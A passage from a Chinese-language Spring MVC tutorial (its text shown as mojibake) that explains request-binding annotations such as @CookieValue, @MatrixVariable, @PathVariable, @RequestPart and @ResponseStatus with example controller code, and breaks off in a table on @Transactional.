 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initDateBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
 Â  Â  Â  <span class="hljs-comment">// æ”¯æŒyyyy-MM-ddå’Œyyyy-MM-dd HH:mm:ssä¸¤ç§æ ¼å¼</span>
 Â  Â  Â  <span class="hljs-type">CustomDateEditor</span> <span class="hljs-variable">dateEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDateEditor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlexibleDateFormat</span>(), <span class="hljs-literal">true</span>);
 Â  Â  Â  binder.registerCustomEditor(Date.class, dateEditor);
 Â  }
 Â  <span class="hljs-comment">// è‡ªå®šä¹‰æšä¸¾è½¬æ¢å™¨</span>
 Â  <span class="hljs-meta">@InitBinder</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initEnumBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
 Â  Â  Â  binder.registerCustomEditor(StatusEnum.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumEditor</span>(StatusEnum.class));
 Â  }
 Â  <span class="hljs-comment">// çµæ´»çš„æ—¥æœŸæ ¼å¼è§£æå™¨</span>
 Â  <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlexibleDateFormat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DateFormat</span> {
 Â  Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;SimpleDateFormat&gt; formats = Arrays.asList(
 Â  Â  Â  Â  Â  <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>),
 Â  Â  Â  Â  Â  <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)
 Â  Â  Â  );
 Â  Â  Â  <span class="hljs-meta">@Override</span>
 Â  Â  Â  <span class="hljs-keyword">public</span> StringBuffer <span class="hljs-title function_">format</span><span class="hljs-params">(Date date, StringBuffer toAppendTo, FieldPosition fieldPosition)</span> {
 Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span> formats.get(<span class="hljs-number">0</span>).format(date, toAppendTo, fieldPosition);
 Â  Â  Â  }
 Â  Â  Â  <span class="hljs-meta">@Override</span>
 Â  Â  Â  <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">parse</span><span class="hljs-params">(String source, ParsePosition pos)</span> {
 Â  Â  Â  Â  Â  <span class="hljs-keyword">for</span> (SimpleDateFormat format : formats) {
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-type">ParsePosition</span> <span class="hljs-variable">parsePos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParsePosition</span>(<span class="hljs-number">0</span>);
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> format.parse(source, parsePos);
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (date != <span class="hljs-literal">null</span>) {
 Â  Â  Â  Â  Â  Â  Â  Â  Â  pos.setIndex(parsePos.getIndex());
 Â  Â  Â  Â  Â  Â  Â  Â  Â  pos.setErrorIndex(parsePos.getErrorIndex());
 Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span> date;
 Â  Â  Â  Â  Â  Â  Â  }
 Â  Â  Â  Â  Â  }
 Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
 Â  Â  Â  }
 Â  }
}
</code></pre>
<h3 data-id="heading-25">4. @ModelAttribute</h3>
<p><code>@ModelAttribute</code> ç”¨äºåœ¨ Controller æ–¹æ³•æ‰§è¡Œå‰ï¼Œå‘ Model ä¸­æ·»åŠ é€šç”¨å±æ€§ï¼Œé€‚ç”¨äºé¡µé¢æ¸²æŸ“ï¼ˆå‰åç«¯ä¸åˆ†ç¦»åœºæ™¯ï¼‰ã€‚</p>
<ul>
<li>å…¨å±€ä½¿ç”¨ï¼šé…åˆ<code>@ControllerAdvice</code>ï¼Œä¸ºæ‰€æœ‰ Controller æ·»åŠ é€šç”¨æ¨¡å‹å±æ€§ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice(basePackages = "com.example.controller")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalModelAttribute</span> {
 Â  <span class="hljs-comment">// ä¸ºæ‰€æœ‰è¯·æ±‚æ·»åŠ å½“å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯</span>
 Â  <span class="hljs-meta">@ModelAttribute("currentUser")</span>
 Â  <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getCurrentUser</span><span class="hljs-params">(HttpServletRequest request)</span> {
 Â  Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"token"</span>);
 Â  Â  Â  <span class="hljs-keyword">return</span> UserContext.getCurrentUser(token); <span class="hljs-comment">// ä»ä¸Šä¸‹æ–‡è·å–ç™»å½•ç”¨æˆ·</span>
 Â  }
}
<span class="hljs-comment">// é¡µé¢ä¸­å¯ç›´æ¥ä½¿ç”¨${currentUser.name}</span>
<span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping("/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
 Â  <span class="hljs-meta">@GetMapping("/info")</span>
 Â  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">userInfo</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-string">"user/info"</span>; <span class="hljs-comment">// é¡µé¢æ¸²æŸ“æ—¶å¯è·å–currentUser</span>
 Â  }
}
</code></pre>
<h3 data-id="heading-26">5. @CookieValue</h3>
<p><code>@CookieValue</code> ç”¨äºä» HTTP Cookie ä¸­è·å–æŒ‡å®šå€¼ï¼Œç»‘å®šåˆ° Controller æ–¹æ³•å‚æ•°ã€‚</p>
<ul>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šæ”¯æŒé»˜è®¤å€¼ï¼Œé¿å… Cookie ä¸å­˜åœ¨æ—¶æŠ›å¼‚å¸¸ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



















<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>required</td><td>æ˜¯å¦å¿…é¡»å­˜åœ¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šCookie ä¸å­˜åœ¨æŠ›å¼‚å¸¸ï¼›â‘¡ <code>false</code>ï¼šä¸å­˜åœ¨åˆ™ä¸º null</td></tr><tr><td>defaultValue</td><td>é»˜è®¤å€¼</td><td>Cookie ä¸å­˜åœ¨æ—¶ä½¿ç”¨ï¼Œå¦‚<code>defaultValue = "guest"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/cookie")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CookieController</span> {
 Â  <span class="hljs-meta">@GetMapping("/get")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">getCookie</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@CookieValue(value = "userId", required = false, defaultValue = "0")</span> String userId
 Â  )</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"ç”¨æˆ·IDï¼š"</span> + userId);
 Â  }
}
</code></pre>
<h3 data-id="heading-27">6. @MatrixVariable</h3>
<p><code>@MatrixVariable</code> ç”¨äºè·å–URL ä¸­çš„çŸ©é˜µå˜é‡ï¼ˆä»¥<code>;</code>åˆ†éš”çš„é”®å€¼å¯¹ï¼‰ï¼Œå¦‚<code>/user/info;id=1;name=test</code>ã€‚</p>
<ul>
<li>æ³¨æ„ï¼šSpring MVC é»˜è®¤ç¦ç”¨çŸ©é˜µå˜é‡ï¼Œéœ€æ‰‹åŠ¨å¼€å¯ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {
 Â  <span class="hljs-meta">@Override</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> {
 Â  Â  Â  <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();
 Â  Â  Â  urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>); <span class="hljs-comment">// å¼€å¯çŸ©é˜µå˜é‡</span>
 Â  Â  Â  configurer.setUrlPathHelper(urlPathHelper);
 Â  }
}
</code></pre>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>çŸ©é˜µå˜é‡å</td><td>ä¸<code>name</code>ç­‰ä»·</td></tr><tr><td>name</td><td>çŸ©é˜µå˜é‡å</td><td>å¦‚<code>name = "id"</code></td></tr><tr><td>pathVar</td><td>è·¯å¾„å˜é‡å</td><td>åŒ¹é…æŒ‡å®šè·¯å¾„å˜é‡ä¸­çš„çŸ©é˜µå˜é‡ï¼Œå¦‚<code>pathVar = "userPath"</code></td></tr><tr><td>required</td><td>æ˜¯å¦å¿…é¡»å­˜åœ¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸å­˜åœ¨æŠ›å¼‚å¸¸ï¼›â‘¡ <code>false</code>ï¼šä¸å­˜åœ¨åˆ™ä¸º null</td></tr><tr><td>defaultValue</td><td>é»˜è®¤å€¼</td><td>å˜é‡ä¸å­˜åœ¨æ—¶ä½¿ç”¨</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/matrix")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MatrixVariableController</span> {
 Â  <span class="hljs-comment">// åŒ¹é…URLï¼š/matrix/user/info;id=1;name=test</span>
 Â  <span class="hljs-meta">@GetMapping("/user/{userPath}")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Map&lt;String, String&gt;&gt; <span class="hljs-title function_">getMatrixVariable</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@MatrixVariable(name = "id", pathVar = "userPath")</span> String id,
 Â  Â  Â  <span class="hljs-meta">@MatrixVariable(name = "name", pathVar = "userPath", defaultValue = "guest")</span> String name
 Â  )</span> {
 Â  Â  Â  Map&lt;String, String&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
 Â  Â  Â  data.put(<span class="hljs-string">"id"</span>, id);
 Â  Â  Â  data.put(<span class="hljs-string">"name"</span>, name);
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(data);
 Â  }
}
</code></pre>
<h3 data-id="heading-28">7. @PathVariable</h3>
<p><code>@PathVariable</code> ç”¨äºè·å– URL è·¯å¾„ä¸­çš„å˜é‡ï¼ˆä»¥<code>{}</code>å£°æ˜ï¼‰ï¼Œæ˜¯ RESTful API çš„æ ¸å¿ƒæ³¨è§£ã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



















<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>required</td><td>æ˜¯å¦å¿…é¡»å­˜åœ¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸å­˜åœ¨æŠ›å¼‚å¸¸ï¼›â‘¡ <code>false</code>ï¼šä¸å­˜åœ¨åˆ™ä¸º null</td></tr><tr><td>defaultValue</td><td>é»˜è®¤å€¼</td><td>è·¯å¾„å˜é‡ä¸å­˜åœ¨æ—¶ä½¿ç”¨</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/path")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PathVariableController</span> {
 Â  <span class="hljs-comment">// åŒ¹é…URLï¼š/path/user/123/detail</span>
 Â  <span class="hljs-meta">@GetMapping("/user/{userId}/detail")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@PathVariable(value = "userId", required = true)</span> Long userId
 Â  )</span> {
 Â  Â  Â  <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(userId, <span class="hljs-string">"æµ‹è¯•ç”¨æˆ·"</span>);
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(user);
 Â  }
}
</code></pre>
<h3 data-id="heading-29">8. @RequestAttribute</h3>
<p><code>@RequestAttribute</code> ç”¨äºè·å– HTTP Request ä¸­çš„å±æ€§å€¼ï¼Œé€‚ç”¨äºè¯·æ±‚è½¬å‘ / åŒ…å«åœºæ™¯ï¼ˆå¦‚è¿‡æ»¤å™¨ä¸­è®¾ç½®çš„å±æ€§ï¼‰ã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>required</td><td>æ˜¯å¦å¿…é¡»å­˜åœ¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸å­˜åœ¨æŠ›å¼‚å¸¸ï¼›â‘¡ <code>false</code>ï¼šä¸å­˜åœ¨åˆ™ä¸º null</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/request")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestAttributeController</span> {
 Â  <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å±æ€§</span>
 Â  <span class="hljs-meta">@GetMapping("/setAttr")</span>
 Â  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">setRequestAttribute</span><span class="hljs-params">(HttpServletRequest request)</span> {
 Â  Â  Â  request.setAttribute(<span class="hljs-string">"traceId"</span>, UUID.randomUUID().toString());
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-string">"forward:/request/getAttr"</span>; <span class="hljs-comment">// è¯·æ±‚è½¬å‘</span>
 Â  }
 Â  <span class="hljs-comment">// è·å–è¯·æ±‚å±æ€§</span>
 Â  <span class="hljs-meta">@GetMapping("/getAttr")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">getRequestAttribute</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@RequestAttribute(value = "traceId", required = false)</span> String traceId
 Â  )</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"è¿½è¸ªIDï¼š"</span> + traceId);
 Â  }
}
</code></pre>
<h3 data-id="heading-30">9. @RequestPart</h3>
<p><code>@RequestPart</code> ç”¨äºå¤„ç†<code>multipart/form-data</code>ç±»å‹çš„è¯·æ±‚ï¼Œé€‚ç”¨äºæ–‡ä»¶ä¸Šä¼ ã€å¤æ‚å‚æ•°æäº¤ï¼ˆå¦‚ JSONã€XMLï¼‰ã€‚</p>
<ul>
<li>æ ¸å¿ƒåŒºåˆ«ï¼š<code>@RequestParam</code>ä»…å¤„ç†ç®€å•è¡¨å•å­—æ®µï¼Œ<code>@RequestPart</code>æ”¯æŒå¤æ‚ç±»å‹å’Œæ–‡ä»¶ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼ˆæ–‡ä»¶ä¸Šä¼  + JSON å‚æ•°ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/upload")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPartController</span> {
 Â  <span class="hljs-comment">// æ¥æ”¶æ–‡ä»¶+JSONå‚æ•°</span>
 Â  <span class="hljs-meta">@PostMapping("/file")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">uploadFile</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@RequestPart("file")</span> MultipartFile file, // ä¸Šä¼ çš„æ–‡ä»¶
 Â  Â  Â  <span class="hljs-meta">@RequestPart("user")</span> <span class="hljs-meta">@Valid</span> User user // JSONæ ¼å¼çš„ç”¨æˆ·ä¿¡æ¯
 Â  )</span> {
 Â  Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
 Â  Â  Â  <span class="hljs-comment">// å¤„ç†æ–‡ä»¶ä¸Šä¼ å’Œç”¨æˆ·ä¿¡æ¯</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"æ–‡ä»¶ï¼š"</span> + fileName + <span class="hljs-string">" ä¸Šä¼ æˆåŠŸï¼Œç”¨æˆ·ï¼š"</span> + user.getName());
 Â  }
}
<span class="hljs-comment">// è¯·æ±‚ç¤ºä¾‹ï¼ˆPostmanï¼‰ï¼š</span>
<span class="hljs-comment">// Content-Type: multipart/form-data</span>
<span class="hljs-comment">// è¡¨å•å­—æ®µï¼š</span>
<span class="hljs-comment">// - fileï¼šé€‰æ‹©æ–‡ä»¶</span>
<span class="hljs-comment">// - userï¼š{"name":"test","age":20}ï¼ˆJSONæ ¼å¼ï¼‰</span>
</code></pre>
<h3 data-id="heading-31">10. @ResponseStatus</h3>
<p><code>@ResponseStatus</code> ç”¨äºè®¾ç½® HTTP å“åº”çŠ¶æ€ç ï¼Œå¯æ ‡æ³¨åœ¨ Controller æ–¹æ³•æˆ–å¼‚å¸¸ç±»ä¸Šã€‚</p>
<ul>
<li>æ ¸å¿ƒç”¨é€”ï¼šè‡ªå®šä¹‰å¼‚å¸¸çš„å“åº”çŠ¶æ€ç ï¼Œæˆ–ä¿®æ”¹æ­£å¸¸è¯·æ±‚çš„çŠ¶æ€ç ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>å“åº”çŠ¶æ€ç </td><td>å¦‚<code>HttpStatus.CREATED</code>ï¼ˆ201ï¼‰ã€<code>HttpStatus.BAD_REQUEST</code>ï¼ˆ400ï¼‰</td></tr><tr><td>code</td><td>åŒ value</td><td>è¯­ä¹‰ç­‰ä»·ï¼Œæ¨èä½¿ç”¨ value</td></tr><tr><td>reason</td><td>å“åº”æè¿°</td><td>çŠ¶æ€ç å¯¹åº”çš„æè¿°ä¿¡æ¯ï¼Œå¦‚<code>reason = "å‚æ•°é”™è¯¯"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹ 1ï¼šæ ‡æ³¨åœ¨æ–¹æ³•ä¸Š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/status")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseStatusController</span> {
 Â  <span class="hljs-comment">// å“åº”çŠ¶æ€ç ï¼š201 Created</span>
 Â  <span class="hljs-meta">@PostMapping("/create")</span>
 Â  <span class="hljs-meta">@ResponseStatus(value = HttpStatus.CREATED, reason = "èµ„æºåˆ›å»ºæˆåŠŸ")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">createResource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-comment">// å¤„ç†èµ„æºåˆ›å»ºé€»è¾‘</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success();
 Â  }
}
</code></pre>
<p><strong>ç¤ºä¾‹ 2ï¼šæ ‡æ³¨åœ¨å¼‚å¸¸ç±»ä¸Š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰å¼‚å¸¸ï¼ŒæŒ‡å®šå“åº”çŠ¶æ€ç </span>
<span class="hljs-meta">@ResponseStatus(value = HttpStatus.NOT_FOUND, reason = "èµ„æºä¸å­˜åœ¨")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceNotFoundException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
 Â  <span class="hljs-keyword">public</span> <span class="hljs-title function_">ResourceNotFoundException</span><span class="hljs-params">(String message)</span> {
 Â  Â  Â  <span class="hljs-built_in">super</span>(message);
 Â  }
}
<span class="hljs-comment">// Controllerä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œè‡ªåŠ¨è¿”å›404</span>
<span class="hljs-meta">@GetMapping("/resource/{id}")</span>
<span class="hljs-keyword">public</span> Result&lt;Resource&gt; <span class="hljs-title function_">getResource</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
 Â  <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> resourceService.getById(id);
 Â  <span class="hljs-keyword">if</span> (resource == <span class="hljs-literal">null</span>) {
 Â  Â  Â  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceNotFoundException</span>(<span class="hljs-string">"èµ„æºIDï¼š"</span> + id + <span class="hljs-string">" ä¸å­˜åœ¨"</span>);
 Â  }
 Â  <span class="hljs-keyword">return</span> Result.success(resource);
}
</code></pre>
<h3 data-id="heading-32">11. @SessionAttribute</h3>
<p><code>@SessionAttribute</code> ç”¨äºä» HTTP Session ä¸­è·å–æŒ‡å®šå±æ€§å€¼ï¼Œé€‚ç”¨äºä¼šè¯çº§æ•°æ®ï¼ˆå¦‚ç™»å½•çŠ¶æ€ã€ç”¨æˆ·ä¿¡æ¯ï¼‰ã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



















<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>required</td><td>æ˜¯å¦å¿…é¡»å­˜åœ¨</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸å­˜åœ¨æŠ›å¼‚å¸¸ï¼›â‘¡ <code>false</code>ï¼šä¸å­˜åœ¨åˆ™ä¸º null</td></tr><tr><td>defaultValue</td><td>é»˜è®¤å€¼</td><td>Session å±æ€§ä¸å­˜åœ¨æ—¶ä½¿ç”¨</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/session")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionAttributeController</span> {
 Â  <span class="hljs-comment">// è®¾ç½®Sessionå±æ€§</span>
 Â  <span class="hljs-meta">@GetMapping("/login")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">login</span><span class="hljs-params">(HttpSession session)</span> {
 Â  Â  Â  <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1L</span>, <span class="hljs-string">"admin"</span>);
 Â  Â  Â  session.setAttribute(<span class="hljs-string">"loginUser"</span>, user); <span class="hljs-comment">// å­˜å‚¨ç™»å½•ç”¨æˆ·</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"ç™»å½•æˆåŠŸ"</span>);
 Â  }
 Â  <span class="hljs-comment">// è·å–Sessionå±æ€§</span>
 Â  <span class="hljs-meta">@GetMapping("/user")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title function_">getLoginUser</span><span class="hljs-params">(
 Â  Â  Â  <span class="hljs-meta">@SessionAttribute(value = "loginUser", required = false)</span> User loginUser
 Â  )</span> {
 Â  Â  Â  <span class="hljs-keyword">if</span> (loginUser == <span class="hljs-literal">null</span>) {
 Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">401</span>, <span class="hljs-string">"æœªç™»å½•"</span>);
 Â  Â  Â  }
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(loginUser);
 Â  }
}
</code></pre>
<h2 data-id="heading-33">ä¸‰ã€äº‹åŠ¡ç®¡ç†ç›¸å…³æ³¨è§£</h2>
<p>äº‹åŠ¡ç®¡ç†æ³¨è§£æ˜¯ Spring å®ç°å£°æ˜å¼äº‹åŠ¡çš„æ ¸å¿ƒï¼Œé€šè¿‡æ³¨è§£å¿«é€Ÿé…ç½®äº‹åŠ¡å±æ€§ï¼Œæ›¿ä»£ä¼ ç»Ÿ XML äº‹åŠ¡é…ç½®ã€‚</p>
<h3 data-id="heading-34">1. @Transactional</h3>
<p><code>@Transactional</code> æ˜¯å£°æ˜å¼äº‹åŠ¡çš„æ ¸å¿ƒæ³¨è§£ï¼Œæ ‡æ³¨åœ¨ç±»æˆ–æ–¹æ³•ä¸Šï¼ŒæŒ‡å®šè¯¥ç±» / æ–¹æ³•çš„äº‹åŠ¡å±æ€§ã€‚</p>
<ul>
<li>ç±»çº§æ³¨è§£ï¼šæ‰€æœ‰ public æ–¹æ³•ç»§æ‰¿äº‹åŠ¡å±æ€§ï¼›</li>
<li>æ–¹æ³•çº§æ³¨è§£ï¼šä¼˜å…ˆçº§é«˜äºç±»çº§ï¼Œå¯å•ç‹¬é…ç½®ï¼›</li>
<li>åº•å±‚ä¾èµ–ï¼šAOP åŠ¨æ€ä»£ç†å®ç°äº‹åŠ¡å¢å¼ºï¼Œé»˜è®¤ä»…æ•è·è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆ<code>RuntimeException</code>ï¼‰ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>




























































<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>äº‹åŠ¡ç®¡ç†å™¨åç§°</td><td>å¦‚<code>value = "transactionManager"</code>ï¼Œå¤šæ•°æ®æºæ—¶æŒ‡å®š</td></tr><tr><td>transactionManager</td><td>åŒ value</td><td>è¯­ä¹‰æ›´æ¸…æ™°ï¼Œæ¨èä½¿ç”¨</td></tr><tr><td>propagation</td><td>äº‹åŠ¡ä¼ æ’­è¡Œä¸º</td><td>æšä¸¾å€¼ï¼Œå¦‚<code>REQUIRED</code>ï¼ˆé»˜è®¤ï¼‰ã€<code>REQUIRES_NEW</code>ã€<code>SUPPORTS</code>ç­‰</td></tr><tr><td>isolation</td><td>äº‹åŠ¡éš”ç¦»çº§åˆ«</td><td>æšä¸¾å€¼ï¼Œå¦‚<code>DEFAULT</code>ï¼ˆé»˜è®¤ï¼Œè·Ÿéšæ•°æ®åº“ï¼‰ã€<code>READ_COMMITTED</code>ã€<code>SERIALIZABLE</code>ç­‰</td></tr><tr><td>timeout</td><td>äº‹åŠ¡è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</td><td>é»˜è®¤ä¸º - 1ï¼ˆæ— è¶…æ—¶ï¼‰ï¼Œè¶…æ—¶æŠ›å‡º<code>TransactionTimedOutException</code></td></tr><tr><td>readOnly</td><td>æ˜¯å¦åªè¯»äº‹åŠ¡</td><td>â‘  <code>true</code>ï¼šåªè¯»ï¼ˆæŸ¥è¯¢æ“ä½œï¼Œä¼˜åŒ–æ€§èƒ½ï¼‰ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šè¯»å†™äº‹åŠ¡</td></tr><tr><td>rollbackFor</td><td>è§¦å‘å›æ»šçš„å¼‚å¸¸ç±»å‹</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>rollbackFor = {SQLException.class, BusinessException.class}</code></td></tr><tr><td>rollbackForClassName</td><td>è§¦å‘å›æ»šçš„å¼‚å¸¸ç±»å</td><td>å­—ç¬¦ä¸²æ•°ç»„ï¼Œå¦‚<code>rollbackForClassName = "java.sql.SQLException"</code></td></tr><tr><td>noRollbackFor</td><td>ä¸è§¦å‘å›æ»šçš„å¼‚å¸¸ç±»å‹</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>noRollbackFor = 